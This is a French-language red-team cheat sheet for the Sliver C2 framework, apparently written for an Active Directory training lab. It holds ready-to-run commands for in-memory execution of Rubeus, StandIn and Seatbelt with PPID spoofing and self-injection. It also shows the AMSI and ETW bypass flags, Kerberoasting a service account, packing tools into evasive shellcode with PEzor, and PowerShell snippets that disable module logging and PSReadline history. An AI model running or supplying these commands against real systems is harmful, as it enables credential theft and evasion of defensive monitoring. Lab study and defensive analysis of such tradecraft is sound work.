# Sliver - Exécution et évasion

> [!summary] Objectif
> Le cœur opérationnel de Sliver : exécuter des outils .NET/BOF **en mémoire** sans lancer PowerShell, avec la bonne technique d'injection selon la furtivité voulue, et en neutralisant les défenses du lab (Script Block Logging, transcription, AMSI, ETW). Presque toutes les autres fiches s'appuient sur `execute-assembly`. Théorie : [[Workflow Sliver]].

> [!warning]- Required
> Une session/beacon actif migré dans un processus hôte stable (voir [[Sliver - Setup et beacons]]). Pour le fork & run, un processus parent crédible pour le PPID spoofing (ex. `explorer.exe`).

### execute-assembly — fork & run (PPID spoofing)

```bash
[server] sliver (dcorp-std_https) > execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--ldap "(&(objectCategory=person)(objectClass=user))"'
```

`-p explorer.exe` : processus parent usurpé (le sacrificiel est spawné sous lui → relation parent/enfant crédible). `-t` timeout. C'est la méthode par défaut pour exécuter un assembly .NET externe en mémoire. Choisir un parent légitime (svchost → RuntimeBroker/sihost/taskhostw) pour se fondre.

### execute-assembly — self-inject + bypass AMSI/ETW

```bash
[server] sliver (dcorp-std_https) > execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'kerberoast /user:svcadmin /simple'
```

`-i` injecte dans le **processus Sliver courant** (pas de sacrificiel = moins d'IOC de spawn), `-M` bypass **AMSI**, `-E` bypass **ETW**. Idéal quand on veut éviter la création de processus, au prix de la stabilité (un crash de l'assembly peut tuer le beacon).

### inline-execute-assembly

```bash
[server] sliver (dcorp-std_https) > inline-execute-assembly '/mnt/c/AD/Tools/Sliver/Seatbelt.exe' 'AntiVirus'
```

Comme `execute-assembly` mais pensé pour la **self-injection** exclusivement (évite le fork & run). Utile pour les petits assemblies quand on veut zéro processus enfant.

### Armory : installer des outils comme modules

```bash
[server] sliver (dcorp-std_https) > armory install sharpup
[server] sliver (dcorp-std_https) > armory install rubeus
[server] sliver (dcorp-std_https) > armory                # lister le catalogue
```

L'armory télécharge des alias (.NET) et des BOF (`sa-*`, COFF/BOF chargés en mémoire) directement utilisables comme commandes Sliver. Les BOF `sa-*` (ex. `sa-sc-enum`, `sa-netshares`) évitent de spawner un assembly complet.

### PEzor : empaqueter un outil en shellcode évasif

```bash
# PEzor transforme un assembly (ex. Rubeus) en shellcode packé, injectable via remote-sc-*/BinLoader
PEzor.exe -32 -sgn -unhook -antisandbox -text Rubeus.exe
```

Sert quand un outil signé/flaggé doit être délivré et exécuté à distance (ex. sur un DC via un service). Le shellcode packé contourne la détection statique et s'injecte comme le beacon initial.

### Neutraliser la journalisation PowerShell

```powershell
# Historique PSReadline
Remove-Module PSReadline

# Module Logging
$m = Get-Module Microsoft.PowerShell.Utility; $m.LogPipelineExecutionDetails = $false
$s = Get-PSSnapin Microsoft.PowerShell.Core; $s.LogPipelineExecutionDetails = $false

# Purger les transcripts
$basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
```

La philosophie du lab Sliver : **ne pas lancer PowerShell directement**. Quand c'est inévitable, Invisi-Shell (`RunWithRegistryNonAdmin.bat`) désactive Script Block Logging / transcription sans droits admin.

> [!important] Choisir sa technique d'injection
> Furtivité maximale, action ponctuelle → **`-i -M -E`** (self-inject, aucun processus enfant). Action longue/instable, ou besoin d'un parent crédible → **fork & run `-p <proc>`**. BOF léger → **`sa-*` / inline-execute**. Toujours vérifier le résultat avec Process Hacker (`amsi.dll` chargée = self-inject actif).

## Related
- [[Sliver - Setup et beacons]]
- [[Sliver - Énumération AD]]
- [[Sliver - Kerberos et tickets]]
- [[Workflow Sliver]]
- [[Sliver - Toutes les commandes]]
